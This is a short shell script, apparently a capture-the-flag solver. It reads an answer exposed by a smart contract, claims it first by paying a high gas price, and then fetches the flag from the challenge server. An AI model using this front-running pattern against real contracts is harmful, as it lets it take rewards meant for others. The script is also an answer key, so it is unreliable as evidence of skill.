RPC=$1
PK=$2
C=$3
ANS=$(cast call "$C" "broadcastAnswer()(string)" --rpc-url "$RPC")
cast send "$C" "claim(string)" "$ANS" --gas-price 100gwei --rpc-url "$RPC" --private-key "$PK"
curl -s "$RPC/flag"
